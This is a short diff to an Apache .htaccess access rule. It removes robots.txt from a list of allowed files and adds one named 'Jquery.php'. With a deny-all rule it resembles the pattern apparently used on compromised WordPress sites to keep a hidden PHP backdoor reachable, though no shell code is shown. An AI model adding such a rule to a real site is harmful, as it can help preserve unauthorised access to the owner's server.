@@ -6,7 +6,7 @@ Deny from all
     Order allow,deny
     Allow from all
 </FilesMatch>
-<FilesMatch '^(index.php|index.html|sitemap.xml|robots.txt|robot.txt|autoload.php|css.php|config.php|wp-config.php)$'>
+<FilesMatch '^(index.php|index.html|sitemap.xml|robot.txt|autoload.php|css.php|config.php|wp-config.php|Jquery.php)$'>
 Order allow,deny
 Allow from all
 </FilesMatch>
